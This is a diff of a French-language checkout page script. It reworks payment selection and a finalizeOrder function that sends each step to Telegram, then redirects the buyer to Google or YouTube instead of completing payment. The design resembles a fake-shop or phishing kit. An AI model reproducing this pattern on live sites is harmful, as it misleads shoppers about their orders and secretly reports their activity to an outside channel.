@@ -287,7 +287,7 @@ pintrk('page');
         </div>
     </div>
 
-    <!-- Step 3b: COD Invoice Modal (UPDATED) -->
+    <!-- Step 3b: COD Invoice Modal -->
     <div id="invoiceCodModal" class="modal">
         <div class="modal-content">
             <span class="close-btn">&times;</span>
@@ -427,21 +427,17 @@ pintrk('page');
             });
         }
         
-        // --- SCRIPT FOR PAYMENT METHOD SELECTION ---
         const paymentCards = document.querySelectorAll('.payment-card');
         paymentCards.forEach(card => {
           card.addEventListener('click', () => {
-            // Remove 'selected' from others & hide all details
             paymentCards.forEach(c => {
               c.classList.remove('border-blue-600', 'shadow-lg');
               c.querySelector('.payment-details').classList.add('hidden');
             });
-            // Select this one
             card.classList.add('border-blue-600', 'shadow-lg');
             card.querySelector('.payment-details').classList.remove('hidden');
             selectedPaymentMethod = card.getAttribute('data-method');
 
-            // Enable button
             nextToInvoiceBtn.disabled = false;
             nextToInvoiceBtn.classList.remove('bg-gray-400');
             nextToInvoiceBtn.classList.add('bg-blue-600', 'hover:bg-blue-700');
@@ -464,17 +460,26 @@ pintrk('page');
             });
         }
         
-        function finalizeOrder(amount, method) {
+        // --- UPDATED Finzlize Order Function ---
+        function finalizeOrder(amount, paymentType) {
             [addToCartModal, paymentMethodModal, invoiceOnlineModal, invoiceCodModal].forEach(modal => {
                 if(modal) modal.style.display = 'none';
             });
 
             if(loadingPopup) loadingPopup.style.display = "flex";
-            sendTelegramAlert('Lancement du paiement final', { montant: amount, méthode: method });
+            sendTelegramAlert('Lancement du paiement final', { montant: amount, méthode: paymentType });
             
             setTimeout(() => {
-                sendTelegramAlert('Redirection (simulation) vers Google initiée');
-                window.location.href = "https://www.google.com";
+                let redirectUrl = "https://www.google.com"; // Default for COD
+                let redirectSiteName = "Google";
+
+                if (paymentType === 'En ligne') {
+                    redirectUrl = "https://www.youtube.com";
+                    redirectSiteName = "YouTube";
+                }
+                
+                sendTelegramAlert(`Redirection (simulation) vers ${redirectSiteName} initiée`);
+                window.location.href = redirectUrl;
             }, 2500);
         }
 
